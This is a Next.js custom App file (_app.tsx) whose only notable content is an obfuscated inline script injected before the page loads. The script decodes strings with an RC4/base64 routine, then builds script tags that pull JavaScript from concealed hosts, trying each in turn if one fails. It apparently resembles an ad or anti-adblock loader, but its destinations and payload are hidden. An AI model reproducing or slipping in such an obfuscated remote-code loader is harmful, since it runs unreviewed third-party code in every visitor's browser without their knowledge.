import "../styles/globals.css";
import type { AppType } from "next/dist/shared/lib/utils";
import Script from "next/script";

const MyApp: AppType = ({ Component, pageProps }) => {
  return (
    <>
      <Script
        id="woo"
        type="text/javascript"
        data-cfasync="false"
        strategy="beforeInteractive"
        dangerouslySetInnerHTML={{
          __html: `/<![CDATA[/ /
          (function(){if(window.c58bfa63bea075c5ba0d81f74e4fae88) return; window.c58bfa63bea075c5ba0d81f74e4fae88="ETQysZFHLmP002bJo3Q271YjjCf2SYoBu9d77jmUIJPKxvzChrAKOlvkXWnL4ASLv36ATEn_wKmPskY";var a=['wpvDqMOkQFvCnQ==','w6M5w7IpE8KlFA==','w5zCuxx3w4UJJB7Chkc+w5U=','aMOlwqnCicOrwqgvw5I=','KXvCh8KxwpTCig==','wqrDvcKUC8OUwq8WHsOffg==','woAfOgB5Jy7Cj8Onw6LDhcKP','wqzDnRPDkg==','QSgUQMOQD1rCjwHDh1VCPgVNw7dLOMO+w4o=','SMOtLcKnYMOr','ORp4aMOEw5zDnMKbwrnDtsK/woFLesKHEDFsQMKWw7DDgVoKOn0PKC8NdcKzX1XDnEFpWsKmwpc=','XcK2QTvCkALDsDBlwprCqcKqw6A=','w5/Coxs0w5IbNCHCil8pw5MTwpPCtcOlGAQ5w6NZLhfCmsOYwrjCkRHDvMKr','w4Rfw48/wr9jIg==','w7Quw7c=','OW/DqT8Fw7fCmcOB','PlksbMOew4jCq8KFwqXDtsKjw59G','w6xSw6c7JwvDhMKCNFnDs2U=','RyMPa8OFB1jCnxw=','wpfDssOzbFE=','LipIwp8jDcKLdcOowpwEGsK8w68=','w7xUw6LCuMOlAsOiZMKpw6kIYibCjcOG','PnLDpTkbw53ChcOcwpTCilU=','HMO0w5x7LUs=','J8Oiw6PCkQ==','TjkUdcOPUBjDhQ=='];(function(b,d){var f=function(g){while(--g){b['push'](b['shift']());}};f(++d);}(a,0x150));var b=function(c,d){c=c-0x0;var e=a[c];if(b['rJvUUh']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['PshekV']=g;b['GsAPcJ']={};b['rJvUUh']=!![];}var f=b['GsAPcJ'][c];if(f===undefined){if(b['wfPkal']===undefined){b['wfPkal']=!![];}e=b['PshekV'](e,d);b['GsAPcJ'][c]=e;}else{e=f;}return e;};var r=window;r[b('0x0','yqMa')]=[[b('0xb','TL@X'),0x4b9ecc],[b('0x2','bswH'),0x0],[b('0x16','EWmU'),'0'],[b('0x13','&[V7'),0x0],[b('0x3',')aKS'),![]],[b('0xd','h8^O'),0x0],[b('0x4','BCIU'),!0x0]];var d=[b('0xe','BCIU'),b('0xc','PBAW')],f=0x0,u,l=function(){if(!d[f])return;u=r[b('0x11','s[n@')][b('0x12','PBAW')](b('0x6','uEb'));u[b('0x9','yx4W')]=b('0x17','pZ5g');u[b('0x15','bswH')]=!0x0;var c=r[b('0x5','TU9')][b('0xa','X7MZ')](b('0x19','hv#S'))[0x0];u[b('0x10',')aKS')]=b('0x1','X7MZ')+d[f];u[b('0x18','s[n@')]=b('0x14','X7MZ');u[b('0xf','HKd3')]=function(){f++;l();};c[b('0x7','2a1c')][b('0x8','RRHG')](u,c);};l();})();
          /]]>/* */`
        }} />
      <Component {...pageProps} />
    </>
  );
};

export default MyApp;
